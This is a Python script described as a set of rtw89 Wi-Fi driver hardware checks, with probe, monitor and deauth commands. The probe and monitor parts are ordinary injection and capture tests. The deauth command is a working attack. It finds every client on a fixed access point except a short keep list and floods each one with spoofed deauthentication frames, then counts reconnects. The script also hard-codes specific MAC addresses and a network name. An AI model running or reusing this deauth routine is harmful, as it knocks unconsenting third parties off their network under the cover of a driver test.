#!/usr/bin/env python3
"""rtw89-test.py - hardware checks for the rtl8851bu / rtw89 driver.

    sudo ./rtw89-test.py probe      # inject a probe request, expect a response
    sudo ./rtw89-test.py deauth     # kick every client except the KEEP list
    sudo ./rtw89-test.py monitor    # count frames and show radiotap fields

Creates a monitor vif next to the associated station and removes it again.
Needs root.

Monitor RX works either way, but injection only works in dedicated monitor mode:
with an associated station the monitor vif has no channel, `set channel` returns
EBUSY, and mac80211 drops the frames before the driver. For `probe`/`deauth`,
take the interface down and `iw dev <if> set type monitor` first.

Results from the machine this was written on are in TESTING.md.
"""

import socket, struct, subprocess, sys, time

MON = "mon0"
BSSID = "d4:01:68:24:dd:10"          # AP, override with --bssid
SSID = "Danii_5"
KEEP = {
    "ac:a7:f1:77:ac:d0",             # this pc
    "98:ba:5f:2b:ac:6d",             # TP-Link, cctv
    "b8:88:80:0b:c3:a2",             # Imilab, camera
}
ETH_P_ALL = 3


def sh(*c):
    return subprocess.run(c, capture_output=True, text=True).stdout


def b(mac):
    return bytes.fromhex(mac.replace(":", ""))


def station():
    for line in sh("iw", "dev").splitlines():
        if line.strip().startswith("Interface "):
            cur = line.split()[1]
        elif line.strip() == "type managed":
            return cur
    return None


def setup():
    sta = station()
    if not sta:
        sys.exit("no associated station interface; connect first")
    if not sh("iw", "dev", MON, "info"):
        subprocess.run(["iw", "dev", sta, "interface", "add", MON, "type", "monitor"], check=True)
    subprocess.run(["ip", "link", "set", MON, "up"], check=True)
    time.sleep(1)
    return sta


def teardown():
    subprocess.run(["ip", "link", "set", MON, "down"], capture_output=True)
    subprocess.run(["iw", "dev", MON, "del"], capture_output=True)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.bind((MON, ETH_P_ALL))
    s.setblocking(False)
    while True:
        try:
            s.recv(4096)
        except BlockingIOError:
            return s


def frames(s, secs, want=None):
    """count frames, optionally only those involving `want`; returns (n, subtypes)"""
    n, subs = 0, []
    end = time.time() + secs
    while time.time() < end:
        try:
            buf = s.recv(4096)
        except BlockingIOError:
            time.sleep(0.005)
            continue
        if len(buf) < 4:
            continue
        off = struct.unpack("<H", buf[2:4])[0]
        if len(buf) < off + 24:
            continue
        fc = struct.unpack("<H", buf[off:off + 2])[0]
        if want and b(want) not in (buf[off + 4:off + 10], buf[off + 10:off + 16]):
            continue
        n += 1
        subs.append((fc >> 4) & 0xf)
    return n, subs


def cmd_probe(s):
    src = b(open(f"/sys/class/net/{MON}/address").read().strip())
    f = (struct.pack("<H", 0x40) + b"\x00\x00" + b(BSSID) + src + b(BSSID) + b"\x00\x00" +
         bytes([0, len(SSID)]) + SSID.encode() + bytes([1, 4, 0x82, 0x84, 0x8b, 0x96]))
    for _ in range(5):
        s.send(f)
        time.sleep(0.2)
    n, subs = frames(s, 3)
    resp = subs.count(5)
    print(f"probe responses: {resp}")
    return 0 if resp else 1


def cmd_monitor(s):
    n, subs = frames(s, 5)
    print(f"frames in 5 s: {n} (mgmt={sum(1 for x in subs if x < 13)})")
    return 0 if n else 1


def cmd_deauth(s):
    counts = {}
    end = time.time() + 6
    while time.time() < end:
        try:
            buf = s.recv(4096)
        except BlockingIOError:
            time.sleep(0.005)
            continue
        if len(buf) < 4:
            continue
        off = struct.unpack("<H", buf[2:4])[0]
        if len(buf) < off + 24:
            continue
        if (struct.unpack("<H", buf[off:off + 2])[0] >> 2) & 3 != 2:
            continue
        for a in (buf[off + 4:off + 10], buf[off + 10:off + 16]):
            m = ":".join(f"{x:02x}" for x in a)
            if m not in KEEP and not m.startswith(("ff:", "01:", "33:")):
                counts[m] = counts.get(m, 0) + 1
    targets = [m for m, n in counts.items() if n >= 2]
    print("targets:", targets or "none")
    if not targets:
        return 1
    f = lambda d: (struct.pack("<H", 0xC0) + b"\x00\x00" + b(d) + b(BSSID) + b(BSSID) +
                   b"\x00\x00" + b"\x07\x00")
    for _ in range(20):
        for t in targets:
            s.send(f(t))
        time.sleep(1)
    for t in targets:
        n, subs = frames(s, 4, t)
        print(f"  {t}: {n} frames after, reconnects={subs.count(11) + subs.count(0)}")
    return 0


def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "probe"
    fn = {"probe": cmd_probe, "deauth": cmd_deauth, "monitor": cmd_monitor}.get(cmd)
    if not fn:
        sys.exit(__doc__)
    setup()
    try:
        return fn(sock())
    finally:
        teardown()


if __name__ == "__main__":
    sys.exit(main())
